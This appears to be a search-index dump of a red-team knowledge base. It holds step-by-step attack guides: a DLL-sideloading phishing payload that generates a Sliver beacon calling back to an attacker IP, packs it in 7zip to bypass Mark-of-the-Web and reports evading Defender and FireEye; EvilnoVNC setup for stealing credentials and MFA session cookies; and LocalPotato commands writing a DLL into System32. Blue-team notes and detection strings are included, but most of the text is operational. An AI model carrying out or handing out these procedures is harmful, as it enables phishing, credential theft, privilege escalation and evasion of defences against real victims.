post, we will change the packing method to use 7zip to bypass MotW security feature. 7zip is a popular open-source file archiving tool. 7zip has updated their tool to include MotW identifiers in the archived files since 22.00 update, however, this feature is disabled by default. Have all your files in the working directory: - OneDrive.Update - XOR encrypted shellcode - dpapi.dll - Malicious proxy DLL - dapi.dll - Actual dpapi.dll that was renamed - OneDriveStandaloneUpdater.exe - Legitimate OneDrive updater binary - Roshan-Bandera-CV-Dialog.lnk - LNK file When you have all of your files in your working directory, pack your directory using 7zip. Remember to hide everything except the LNK file. You may consider password protecting the archive. Wrap up Now that everything is set, we have the following payload wrapped up in a 7zip archive: TYPE NAME DESCRIPTION 7zip Roshan_CV.7zip 7zip file that extracts the payloads LNK Roshan-Bandera-CV-Dialog.lnk Windows shortcut file which starts OneDriveStandaloneUpdater.exe through cmd.exe EXE OneDriverStandaloneUpdater.exe A legitimate digitally signed Microsoft PE binary that is used to update OneDrive DLL dpapi.dll Malicious proxy DLL that gets DLL sideloaded DLL dapi.dll Legitimate dpapi.dll that is created by Microsoft Shellcode OneDrive.Update Encrypted shellcode that gets executed by dpapi.dll The execution flow of this attack can be seen below. Result Send your 7zip payload to the target. The victim should right click the archived folder and click 7zip -> Extract to \"XYZ\" and run the payload. As seen above, our payload gets executed successfully and we get a callback from the Sliver beacon. The payload was not detected by up-to-date Microsoft Defender as of 14.06.2023 FireEye Endpoint Security Version v33.46.6 did not detect the payload. Possible improvements The Sliver beacon that was used is huge (~10MB!!) consider using either a stager or another implant that is smaller in size. The process injection technique that was used is well documented. Consider using some other technique, perform direct system calls, anti-sandboxing etc. if you wish to be more stealthy. Go crazy :D Blue team perspective This attack heavily relies on the DLL side-loading technique. MITRE ATT&CK MATRIX TA0001 - Initial access - T1566 - Phishing TA0002 - Execution - T1204 - User Execution - T1204.002 - Malicious File TA0005 - Defence Evasion - T1564 - Hide Artifacts - T1564.001 - Hidden Files and Directories - T1574 - Hijack Execution Flow - T1574.002 - DLL Side-Loading - T1027 - Obfuscated files or information - T1027.002 - Software Packing - T1553 - Subvert Trust Controls - T1553.005 - Mark-of-the-Web Bypass - T1218 - System Binary Proxy Execution - T1036 - Masquerading TA0011 - Command and Control - T1573 - Encrypted Channel Sources Harbison Mike & Renals Peter. 2022. When Pentest Tools Go Brutal: Red-Teaming Tool Being Abused by Malicious Actors. Unit42 PaloAltoNetworks blog. https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/","title":"DLL Hijack"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#initial-access-by-using-dll-sideloading-and-abusing-signed-binaries","text":"This post showcases an attempt to emulate the initial access payload demonstrated in PaloAltoNetworks Unit42's blog post . The payload encompasses an ISO file containing on-disk shellcode, DLL sideloading payloads, and an LNK file to initiate the DLL sideloading process. Certain modifications have been made to certain steps, notably the packaging method for the ISO payload, which has been addressed by Microsoft's patches.","title":"Initial access by using DLL sideloading and abusing signed binaries"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#the-original-payload","text":"Based on the Unit42 blog post, the attackers used an ISO payload with DLL sideloading, a LNK file and on-disk shellcode. The below diagram shows the attack flow: Image from PaloAlto Unit42 blog post. The initial payload starts as an ISO file. This was done most likely to bypass Mark-of-the-Web security feature. The following elements are inside the ISO file after it's mounted: TYPE NAME DESCRIPTION ISO Roshan_CV.iso ISO file that gets mounted and extracts payloads LNK Roshan-Bandara-CV-Dialog.lnk Windows shortcut file which starts OneDriveUpdater.exe through cmd.exe EXE OneDriverUpdater.exe A legitimate digitally signed Microsoft PE binary that is used to update OneDrive DLL version.dll Malicious proxy DLL that gets DLL sideloaded DLL vresion.dll Legitimate version.dll that is digitally signed by Microsoft Shellcode OneDrive.Update Shellcode that gets executed by version.dll The payload gets executed through the following steps: The ISO file extracts all the payloads listed in the table above. Victim user clicks the LNK file. The LNK file starts cmd.exe which then starts the OneDriveUpdater.exe. OneDriveUpdater.exe sideloads the attacker's version.dll. version.dll reads the shellcode (OneDrive.Update) from disk, decrypts it using XOR, and injects the shellcode into theRuntimeBroker.exe process. Any legitimate function calls to the version.dll gets proxied to the legitimate version.dll library -vresion.dll Based on the details above, let's recreate the payloads.","title":"The original payload"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#emulating-the-initial-access-with-no-money-and-no-skills","text":"","title":"Emulating the initial access with no money and no skills"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#1-shellcode","text":"The attackers used shellcode from Brute Ratel's C4 agent. This can be substituted with anything such as CobaltStrike or Meterpreter. In this case a Sliver beacon is generated: sliver > generate beacon --mtls <IP> -f shellcode --save /tmp/OneDrive.update The shellcode has to be XOR encrypted. The attackers used a 28-byte key jikoewarfkmzsdlhfnuiwaejrpaw to encrypt the shellcode. In this repository there's a simple XOR encryption tool XOR-tool.py written in Python3 that can do that. Change the parameters and and run the tool inside the directory the shellcode resides.","title":"1 - Shellcode"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#2-onedrivestandaloneupdater-and-finding-a-sideloadable-dll","text":"You can obtain OneDriveStandaloneUpdater binary if you have the OneDrive installed on a machine at C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive . Alternatively, you can download it through malshare by the IoC hashes that was listed in the Unit42's blog post. After you've got the binary, place it in a your working directory. The attackers used version.dll for their sideloading target. If you wish to use it, find it in c:\\windows\\system32 and copy it in the same working directory. Alternatively, you can find your own sideloading target with a tool like Spartacus or by running the binary with Procmon running in the background with the following filters: The results show potential DLL sideloading targets: In this case, this post will show how to sideload dpapi.dll , which the OneDriveStandaloneUpdater binary tries to load. Copy the DLL into your working directory.","title":"2 - OneDriveStandaloneUpdater and finding a sideloadable DLL"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#3-dll-sideloading","text":"To create the malicious proxy DLL, you can use tool such as SharpDllProxy . To use it, clone the repository and compile it. Copy over the shellcode file and the dpapi.dll file in the directory where SharpDLLProxy is. Then, run it. cp c:\\windows\\system32\\dpapi.dll . .\\SharpDllProxy.exe --dll .\\dpapi.dll --payload .\\OneDrive.Update SharpDLLProxy will create a DLL and a .c file. The DLL is just a renamed dpapi.dll- rename the file to dapi.dll. Renaming the DLL is not necessary, this just mimics the filenames from the blog post. The .c file serves as the source code that will be compiled to generate the malicious DLL file. It is necessary to make alterations to this source code in order to align with the tactics, techniques, and procedures (TTPs) employed by the attackers.","title":"3 - DLL Sideloading"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#4-modifying-the-proxy-dll","text":"The dpapi_pragma.c file is the file that needs to be compiled into the malicious proxy DLL - dpapi.dll. Open up Visual Studio (or any IDE) and create a Dynamic-Link Library (DLL) C++ project. The source code needs modifications to mimic the TTPs of the attackers. In the blog post, the attackers perform remote process injection using NtMapViewOfSection Windows API to map a memory section for the decrypted payload which gets reflected into Runtimebroker.exe memory space. In this post, we will execute the shellcode inline within the OneDriveStandaloneUpdater.exe without the need for remote process injection. The source code for the dpapi.dll is in this repository. If using Visual Studio, make sure the Project Charset is correctly set. Right click the project -> Properties -> Advanced -> Character Set -> Set to Use Multi-byte Character Set for the correct Configuration & Platform.","title":"4 - Modifying the proxy DLL"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#5-lnk-file","text":"The LNK file is used to execute OneDriveStandaloneUpdater.exe with cmd.exe . On Windows this can be done easily by right clicking inside our working directory and clicking New -> Shortcut. Right click the shortcut and click Properties. Edit the target section to run cmd.exe to execute OneDriveStandaloneUpdater.exe binary with the line: %windir%/system32/cmd.exe /c OneDriveStandaloneUpdater.exe Change the name and the icon of the LNK file as you see fit.","title":"5 - LNK file"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#6-7zip-packing","text":"In the original payload, the attackers used ISO format to pack their payload. This was most likely done to bypass Mark-of-the-Web (MotW) security feature. Microsoft has patched the ISO packing method in their November 2022 Patch security updates . In this post, we will change the packing method to use 7zip to bypass MotW security feature. 7zip is a popular open-source file archiving tool. 7zip has updated their tool to include MotW identifiers in the archived files since 22.00 update, however, this feature is disabled by default. Have all your files in the working directory: - OneDrive.Update - XOR encrypted shellcode - dpapi.dll - Malicious proxy DLL - dapi.dll - Actual dpapi.dll that was renamed - OneDriveStandaloneUpdater.exe - Legitimate OneDrive updater binary - Roshan-Bandera-CV-Dialog.lnk - LNK file When you have all of your files in your working directory, pack your directory using 7zip. Remember to hide everything except the LNK file. You may consider password protecting the archive.","title":"6 - 7zip packing"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#wrap-up","text":"Now that everything is set, we have the following payload wrapped up in a 7zip archive: TYPE NAME DESCRIPTION 7zip Roshan_CV.7zip 7zip file that extracts the payloads LNK Roshan-Bandera-CV-Dialog.lnk Windows shortcut file which starts OneDriveStandaloneUpdater.exe through cmd.exe EXE OneDriverStandaloneUpdater.exe A legitimate digitally signed Microsoft PE binary that is used to update OneDrive DLL dpapi.dll Malicious proxy DLL that gets DLL sideloaded DLL dapi.dll Legitimate dpapi.dll that is created by Microsoft Shellcode OneDrive.Update Encrypted shellcode that gets executed by dpapi.dll The execution flow of this attack can be seen below.","title":"Wrap up"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#result","text":"Send your 7zip payload to the target. The victim should right click the archived folder and click 7zip -> Extract to \"XYZ\" and run the payload. As seen above, our payload gets executed successfully and we get a callback from the Sliver beacon. The payload was not detected by up-to-date Microsoft Defender as of 14.06.2023 FireEye Endpoint Security Version v33.46.6 did not detect the payload.","title":"Result"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#possible-improvements","text":"The Sliver beacon that was used is huge (~10MB!!) consider using either a stager or another implant that is smaller in size. The process injection technique that was used is well documented. Consider using some other technique, perform direct system calls, anti-sandboxing etc. if you wish to be more stealthy. Go crazy :D","title":"Possible improvements"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#blue-team-perspective","text":"This attack heavily relies on the DLL side-loading technique.","title":"Blue team perspective"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#mitre-attck-matrix","text":"TA0001 - Initial access - T1566 - Phishing TA0002 - Execution - T1204 - User Execution - T1204.002 - Malicious File TA0005 - Defence Evasion - T1564 - Hide Artifacts - T1564.001 - Hidden Files and Directories - T1574 - Hijack Execution Flow - T1574.002 - DLL Side-Loading - T1027 - Obfuscated files or information - T1027.002 - Software Packing - T1553 - Subvert Trust Controls - T1553.005 - Mark-of-the-Web Bypass - T1218 - System Binary Proxy Execution - T1036 - Masquerading TA0011 - Command and Control - T1573 - Encrypted Channel","title":"MITRE ATT&amp;CK MATRIX"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/#sources","text":"Harbison Mike & Renals Peter. 2022. When Pentest Tools Go Brutal: Red-Teaming Tool Being Abused by Malicious Actors. Unit42 PaloAltoNetworks blog. https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/","title":"Sources"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/","text":"EvilnoVNC for phishing & MFA bypass Background EvilnoVNC ( github ) is a phishing tool that uses Browser-in-the-middle attack to steal credentials and bypass Multifactor Authentication (MFA). The EvilnoVNC attack platform uses an open-source noVNC javascript client to run a transparent malicious Chromium browser between the victim and the target web application. Browser-in-the-middle attack. Source EvilnoVNC plaform attack chart. Source Requirements docker Installation and Usage Install EvilnoVNC: git clone https://github.com/JoelGMSec/EvilnoVNC cd EvilnoVNC ; sudo chown -R 103 Downloads sudo docker build -t joelgmsec/evilnovnc . Usage: Display options with the ./start.sh -h -command. \u250c\u2500\u2500(kali\u327fkali-vle)-[~/techiques/noVNCphish/EvilnoVNC] \u2514\u2500$ ./start.sh 1920x1080x24 https://<your target domain here> _____ _ _ __ ___ _ ____ | ____|_ _(_) |_ __ __\\ \\ / / \\ | |/ ___| | _| \\ \\ / / | | '_ \\ / _ \\ \\ / /| \\| | | | |___ \\ V /| | | | | | (_) \\ V / | |\\ | |___ |_____| \\_/ |_|_|_| |_|\\___/ \\_/ |_| \\_|\\____| ---------------- by @JoelGMSec -------------- [>] EvilnoVNC Server is running.. [+] URL: http://localhost [!] Press Ctrl+C at any time to close! [+] Avoiding dynamic resolution steps.. [+] Desktop Resolution: 1920x1080x24 [+] Cookies will be updated every 30 seconds.. Setting up EvilnoVNC phishing platform Testing results The tool has been tested to phish test google account credentials enabled with MFA. A link was first sent to the victim who then navigated to the EvilnoVNC platform: The victim clicks the link and is taken to the chosen domain.In this case is is accounts.google.com . Notice the URL points to the attacker's domain. The victim logs in to the service with MFA. The victim is now logged into their account on the attacker's browser. Session cookies and keystrokes are captured in the background: At this point the attacker can either use captured cookies to log in to the account or just kick the victim off the noVNC platform and use it themselves. The tool also works on mobile browsers. Limitations Currently this setup is only suitable for spear phishing attacks. Only one user can use one noVNC service. Some sort of proxy would have to be set up to redirect different users to their own noVNC services. Possible solutions are found here While the actual target service is 100% authentic, the domain the victim navigates to is the attacker's. This can be seen in the URL. Perceptive users can detect this, leading to phishing failure. The browser's dimensions have to be specified beforehand. This is not a huge problem if the victim's device-type is known. Desktops typically have 1920x1080 dimensions for example. Blue team perspective As with other phishing attacks, proper end user education can thwart attacks such as these. The attacker's domain can be seen in the URL when the victim navigates to the site. Mitre ATT&CK TA0001 - Initial access - T1566 - Phishing TA0006 - Credential access - T1557 - Adversary-in-the-middle - T1056 - Input Capture - T1539 - Steal Web Session Cookies TA0009 - Collection - T1557 - Adversary-in-the-middle - T1185 - Browser Session Hijacking - T1056 - Input Capture","title":"EvilNoVNC"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#evilnovnc-for-phishing-mfa-bypass","text":"","title":"EvilnoVNC for phishing &amp; MFA bypass"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#background","text":"EvilnoVNC ( github ) is a phishing tool that uses Browser-in-the-middle attack to steal credentials and bypass Multifactor Authentication (MFA). The EvilnoVNC attack platform uses an open-source noVNC javascript client to run a transparent malicious Chromium browser between the victim and the target web application. Browser-in-the-middle attack. Source EvilnoVNC plaform attack chart. Source","title":"Background"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#requirements","text":"docker","title":"Requirements"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#installation-and-usage","text":"Install EvilnoVNC: git clone https://github.com/JoelGMSec/EvilnoVNC cd EvilnoVNC ; sudo chown -R 103 Downloads sudo docker build -t joelgmsec/evilnovnc . Usage: Display options with the ./start.sh -h -command. \u250c\u2500\u2500(kali\u327fkali-vle)-[~/techiques/noVNCphish/EvilnoVNC] \u2514\u2500$ ./start.sh 1920x1080x24 https://<your target domain here> _____ _ _ __ ___ _ ____ | ____|_ _(_) |_ __ __\\ \\ / / \\ | |/ ___| | _| \\ \\ / / | | '_ \\ / _ \\ \\ / /| \\| | | | |___ \\ V /| | | | | | (_) \\ V / | |\\ | |___ |_____| \\_/ |_|_|_| |_|\\___/ \\_/ |_| \\_|\\____| ---------------- by @JoelGMSec -------------- [>] EvilnoVNC Server is running.. [+] URL: http://localhost [!] Press Ctrl+C at any time to close! [+] Avoiding dynamic resolution steps.. [+] Desktop Resolution: 1920x1080x24 [+] Cookies will be updated every 30 seconds.. Setting up EvilnoVNC phishing platform","title":"Installation and Usage"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#testing-results","text":"The tool has been tested to phish test google account credentials enabled with MFA. A link was first sent to the victim who then navigated to the EvilnoVNC platform: The victim clicks the link and is taken to the chosen domain.In this case is is accounts.google.com . Notice the URL points to the attacker's domain. The victim logs in to the service with MFA. The victim is now logged into their account on the attacker's browser. Session cookies and keystrokes are captured in the background: At this point the attacker can either use captured cookies to log in to the account or just kick the victim off the noVNC platform and use it themselves. The tool also works on mobile browsers.","title":"Testing results"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#limitations","text":"Currently this setup is only suitable for spear phishing attacks. Only one user can use one noVNC service. Some sort of proxy would have to be set up to redirect different users to their own noVNC services. Possible solutions are found here While the actual target service is 100% authentic, the domain the victim navigates to is the attacker's. This can be seen in the URL. Perceptive users can detect this, leading to phishing failure. The browser's dimensions have to be specified beforehand. This is not a huge problem if the victim's device-type is known. Desktops typically have 1920x1080 dimensions for example.","title":"Limitations"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#blue-team-perspective","text":"As with other phishing attacks, proper end user education can thwart attacks such as these. The attacker's domain can be seen in the URL when the victim navigates to the site.","title":"Blue team perspective"},{"location":"4-initial-access/phishing/evilnovnc/EvilnoVNC/#mitre-attck","text":"TA0001 - Initial access - T1566 - Phishing TA0006 - Credential access - T1557 - Adversary-in-the-middle - T1056 - Input Capture - T1539 - Steal Web Session Cookies TA0009 - Collection - T1557 - Adversary-in-the-middle - T1185 - Browser Session Hijacking - T1056 - Input Capture","title":"Mitre ATT&amp;CK"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/","text":"Background LocalPotato is used to exploit Windows vulnerability CVE-2023-21746 on non-DC machines. Like other \"potato\" exploits, it abuses a flaw in NTLM authentication, local version of it specifically. Using this exploit, the attacker can read and write arbitrary files in a Windows machine with SYSTEM privileges. The exploit binary has been pre-compiled and it can be found in LocalPotato/x64/Debug/LocalPotato.exe . Directory LocalPotato is a clone of the original repository https://github.com/decoder-it/LocalPotato. As this exploit only leads to arbitrary file reading / writing with SYSTEM privileges, it cannot be used for code execution directly. To perform a code execution with SYSTEM privileges, LocalPotato can be chained with DLL-hijacking by writing a malicious DLL-library to Windows PATH. This can be done with StorSvc_privesc as example. Technical overview Local NTLM authentication is not based on a challenge-response type of mechanism. Instead, the client messages it's workstation name and domain to LSASS, ( Local Security Authority Server Service ), the LSASS sends the client a security context ID , and the client informs the server if it has correctly associated itself with the specific security context ID. The exploit can be seen as a man-in-the-middle attack. The main idea is to make a privileged process to start a local NTLM authentication to a \"rogue\" SMB server run by the attacker. The rogue server provides Security Context A for the privileged connection but won't immediately pass the response to the process. Simultaneously, the attacker starts his own client (\"rogue client\") to initiate a connection to the local SMB Server with current unprivileged credentials. Rogue client then receives Security Context B . Attacker then swaps the security contexts, associating the privileged security context with his own client and passes the unprivileged context to the system's client process. With the high-privileged security context, attacker opens an SMB connection to tree \\\\127.0.0.1\\c$ , requests file creation and write operations and closes the file. The figure below demonstrates the exploit process. Requirements Following conditions must be met for the target to be exploit: Victim host must not have January 2023 security updates installed Victim host must not be a domain controller Victim host must have default SMB shares enabled ( C$ and ADMIN$ ) These shares should be listed in output when executing command net share Command reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /v AutoShareWks should return 0x1 for property AutoShareWks if shares are enabled To enable shares (preparing environment), execute command reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /f /v AutoShareWks /t REG_DWORD /d 1 with administrative privileges -> then reboot the computer and run command net share to check that the shares exist Attack steps Deliver LocalPotato.exe to the victim host. With the binary on the victim machine, carry out desired actions using following syntax: LocalPotato.exe -i IN_FILE -o OUT_FILE # Write with SYSTEM privileges, write to C:\\Windows\\System32\\ LocalPotato.exe -i bad.dll -o \\Windows\\System32\\bad.dll # Read with SYSTEM privileges LocalPotato.exe -i \\Windows\\System32\\forbidden.file -o \\Users\\user\\Desktop\\forbidden.file MIND THE USAGE : Do NOT use the drive letter in output path! The figure below demonstrates the usage and output: For blue teams Traces left by this attack consist of localhost network traces and static traces. Static traces are traces like file artifacts and file hashes. Dynamic traces are the ones created during the execution of the exploit binary, such as network traces. NOTE: During the testing, usage of the LocalPotato binary could not be connected to any Windows Event Log events. The binary was executed and execution did not lead to any new events appearing in the statistics. Static traces There is one certain definable static trace left by this exploit which is the exploit binary. There are several possible ways to detect this binary. Detecting LocalPotato.exe Trace / type Trace location Hash Presence indicator Additional info LocalPotato.exe / file Victim host md5: 2a9c6005e53b4e4738bf2d519fe2db1b , sha1: 2238d9ca63cbc2b89d7feb692d411e55111a3dc6 100% Hash is a certain indicator though easily altered by the attacker Strings, LocalPotato.exe There are many strings which can be used for hunting the exploit binary. The most certain string to look for is: case insensitive localpotato . Few other usable hunting strings are provided below: LocalPotato (aka CVE-2023-21746) by splinter_code & decoder_it [*] Objref Moniker Display Name = [*] Calling CoGetInstanceFromIStorage with CLSID: [*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes [*] Received DCOM NTLM type 1 authentication from the privileged client [*] Connected to the SMB server with ip 127.0.0.1 and port 445 [+] SMB Client Auth Context swapped with SYSTEM [+] RPC Server Auth Context swapped with the Current User [*] Received DCOM NTLM type 3 authentication from the privileged client [+] SMB reflected DCOM authentication succeeded! [+] SMB Connect Tree: \\\\127.0.0.1\\c$ success [+] SMB Create Request File: [+] SMB Write Request file: [+] SMB Close File success [+] SMB Tree Disconnect success Dynamic traces Traces have been mapped to attack procedures which are executed during the exploitation. Listed attack procedures might not separate manual actions carried out by the attacker. The procedures might be smaller actions induced by a single command executed by the attacker. Windows event traces Reminder: No events were found to be created by by exploiting the vulnerability. Networking traces Exploiting the vulnerability causes network traffic captureable with localhost interface. It is difficult to recognize the traffic directly related to LocalPotato. There are some general indicators which were found to be related to usage of LocalPotato binary. These individual indicators are related to the exploit as a group . They cannot be individually used to detect LocalPotato exploitation. General networking traces ( localhost interface ) Using the exploit causes at least following network traces: NTLM NetNTLM authentication to localhost port 135 Local NTLM authentication to localhost port 135 SMB SMB session setup request to localhost port 445 SMB tree connect request to tree \\\\127.0.0.1\\c$ SMB file create request to destination of attackers choosing SMB file write request SMB file close request SMB tree disconnect request Pcap-files LocalPotato1.pcapng and LocalPotato2.pcapng are provided in the repository directory PCAPs .","title":"LocalPotato"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#background","text":"LocalPotato is used to exploit Windows vulnerability CVE-2023-21746 on non-DC machines. Like other \"potato\" exploits, it abuses a flaw in NTLM authentication, local version of it specifically. Using this exploit, the attacker can read and write arbitrary files in a Windows machine with SYSTEM privileges. The exploit binary has been pre-compiled and it can be found in LocalPotato/x64/Debug/LocalPotato.exe . Directory LocalPotato is a clone of the original repository https://github.com/decoder-it/LocalPotato. As this exploit only leads to arbitrary file reading / writing with SYSTEM privileges, it cannot be used for code execution directly. To perform a code execution with SYSTEM privileges, LocalPotato can be chained with DLL-hijacking by writing a malicious DLL-library to Windows PATH. This can be done with StorSvc_privesc as example.","title":"Background"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#technical-overview","text":"Local NTLM authentication is not based on a challenge-response type of mechanism. Instead, the client messages it's workstation name and domain to LSASS, ( Local Security Authority Server Service ), the LSASS sends the client a security context ID , and the client informs the server if it has correctly associated itself with the specific security context ID. The exploit can be seen as a man-in-the-middle attack. The main idea is to make a privileged process to start a local NTLM authentication to a \"rogue\" SMB server run by the attacker. The rogue server provides Security Context A for the privileged connection but won't immediately pass the response to the process. Simultaneously, the attacker starts his own client (\"rogue client\") to initiate a connection to the local SMB Server with current unprivileged credentials. Rogue client then receives Security Context B . Attacker then swaps the security contexts, associating the privileged security context with his own client and passes the unprivileged context to the system's client process. With the high-privileged security context, attacker opens an SMB connection to tree \\\\127.0.0.1\\c$ , requests file creation and write operations and closes the file. The figure below demonstrates the exploit process.","title":"Technical overview"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#requirements","text":"Following conditions must be met for the target to be exploit: Victim host must not have January 2023 security updates installed Victim host must not be a domain controller Victim host must have default SMB shares enabled ( C$ and ADMIN$ ) These shares should be listed in output when executing command net share Command reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /v AutoShareWks should return 0x1 for property AutoShareWks if shares are enabled To enable shares (preparing environment), execute command reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /f /v AutoShareWks /t REG_DWORD /d 1 with administrative privileges -> then reboot the computer and run command net share to check that the shares exist","title":"Requirements"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#attack-steps","text":"Deliver LocalPotato.exe to the victim host. With the binary on the victim machine, carry out desired actions using following syntax: LocalPotato.exe -i IN_FILE -o OUT_FILE # Write with SYSTEM privileges, write to C:\\Windows\\System32\\ LocalPotato.exe -i bad.dll -o \\Windows\\System32\\bad.dll # Read with SYSTEM privileges LocalPotato.exe -i \\Windows\\System32\\forbidden.file -o \\Users\\user\\Desktop\\forbidden.file MIND THE USAGE : Do NOT use the drive letter in output path! The figure below demonstrates the usage and output:","title":"Attack steps"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#for-blue-teams","text":"Traces left by this attack consist of localhost network traces and static traces. Static traces are traces like file artifacts and file hashes. Dynamic traces are the ones created during the execution of the exploit binary, such as network traces. NOTE: During the testing, usage of the LocalPotato binary could not be connected to any Windows Event Log events. The binary was executed and execution did not lead to any new events appearing in the statistics.","title":"For blue teams"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#static-traces","text":"There is one certain definable static trace left by this exploit which is the exploit binary. There are several possible ways to detect this binary.","title":"Static traces"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#detecting-localpotatoexe","text":"Trace / type Trace location Hash Presence indicator Additional info LocalPotato.exe / file Victim host md5: 2a9c6005e53b4e4738bf2d519fe2db1b , sha1: 2238d9ca63cbc2b89d7feb692d411e55111a3dc6 100% Hash is a certain indicator though easily altered by the attacker","title":"Detecting LocalPotato.exe"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#strings-localpotatoexe","text":"There are many strings which can be used for hunting the exploit binary. The most certain string to look for is: case insensitive localpotato . Few other usable hunting strings are provided below: LocalPotato (aka CVE-2023-21746) by splinter_code & decoder_it [*] Objref Moniker Display Name = [*] Calling CoGetInstanceFromIStorage with CLSID: [*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes [*] Received DCOM NTLM type 1 authentication from the privileged client [*] Connected to the SMB server with ip 127.0.0.1 and port 445 [+] SMB Client Auth Context swapped with SYSTEM [+] RPC Server Auth Context swapped with the Current User [*] Received DCOM NTLM type 3 authentication from the privileged client [+] SMB reflected DCOM authentication succeeded! [+] SMB Connect Tree: \\\\127.0.0.1\\c$ success [+] SMB Create Request File: [+] SMB Write Request file: [+] SMB Close File success [+] SMB Tree Disconnect success","title":"Strings, LocalPotato.exe"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#dynamic-traces","text":"Traces have been mapped to attack procedures which are executed during the exploitation. Listed attack procedures might not separate manual actions carried out by the attacker. The procedures might be smaller actions induced by a single command executed by the attacker.","title":"Dynamic traces"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#windows-event-traces","text":"Reminder: No events were found to be created by by exploiting the vulnerability.","title":"Windows event traces"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#networking-traces","text":"Exploiting the vulnerability causes network traffic captureable with localhost interface. It is difficult to recognize the traffic directly related to LocalPotato. There are some general indicators which were found to be related to usage of LocalPotato binary. These individual indicators are related to the exploit as a group . They cannot be individually used to detect LocalPotato exploitation.","title":"Networking traces"},{"location":"5-local-privilege-escalation/localpotato/LocPotato/#general-networking-traces-localhost-interface","text":"Using the exploit causes at least following network traces: NTLM NetNTLM authentication to localhost port 135 Local NTLM authentication to localhost port 135 SMB SMB session setup request to localhost port 445 SMB tree connect request to tree \\\\127.0.0.1\\c$ SMB file create request to destination of attackers choosing SMB file write request SMB file close request SMB tree disconnect request Pcap-files LocalPotato1.pcapng and LocalPotato2.pcapng are provided in the repository directory PCAPs .","title":"General networking traces (localhost interface)"},{"location":"5-local-privilege-escalation/localpotato/LocalPotato/","text":"LocalPotato Another Local Windows privilege escalation using a new potato technique ;) The LocalPotato attack is a type of NTLM reflection attack that targets local authentication. This attack allows for arbitrary file read/write and elevation of privilege. NOTE: This vulnerability has been fixed by Microsoft in the January 2023 Patch Tuesday with the CVE-2023-21746 . If you run this exploit against a patched machine it won't work. More technical details at --> https://www.localpotato.com/localpotato_html/LocalPotato.html Usage LocalPotato (aka CVE-2023-21746) by splinter_code & decoder_it Mandatory Args: -i Source file to copy -o Output file - do not specify the drive letter Example: localpotato -i c:\\hacker\\evil.dll -o windows\\system32\\evil.dll Optional Args: -c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51}) -p COM server port (Default 10271) Demo Authors: @decoder_it @splinter_code","title":"LocalPotato"},{"location":"5-local-privilege-escalation/localpotato/LocalPotato/#localpotato","text":"Another Local Windows privilege escalation using a new potato technique ;) The LocalPotato attack is a type of NTLM reflection attack that targets local authentication. This attack allows for arbitrary file read/write and elevation of privilege. NOTE: This vulnerability has been fixed by Microsoft in the January 2023 Patch Tuesday with the CVE-2023-21746 . If you run this exploit against a patched machine it won't work. More technical details at --> https://www.localpotato.com/localpotato_html/LocalPotato.html","title":"LocalPotato"},{"location":"5-local-privilege-escalation/localpotato/LocalPotato/#usage","text":"LocalPotato (aka CVE-2023-21746) by splinter_code & decoder_it Mandatory Args: -i Source file to copy -o Output file - do not specify the drive letter Example: localpotato -i c:\\hacker\\evil.dll -o windows\\system32\\evil.dll Optional Args: -c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51}) -p COM server port (Default 10271)","title":"Usage"},{"location":"5-local-privilege-escalation/localpotato/LocalPotato/#demo","text":"","title":"Demo"},{"location":"5-local-privilege-escalation/localpotato/LocalPotato/#authors","text":"@decoder_it @splinter_code","title":"Authors:"},{"location":"5-local-privilege-escalation/sigflip/sigflip-OLD/","text":"SigFlip / SigLoader Background These tools are used for embedding custom shellcode into a signed binary. The binary is executed in a victim system using SigLoader.exe . A Windows machine is required for using this toolkit. Since the (malicious) shellcode is encrypted, this method is highly effective at smuggling shellcode into the victim host past any defensive measures. Link to the original Git repository. Two executables and three libraries have been already compiled using VS Studio. The ready-to-use toolbox includes five files listed in the table below. File Function Purpose SigFlip.exe Shellcode encrypter & injector Execute in attacker's Windows machine SigLoader.exe Shellcode decrypter & loader Execute in victim's 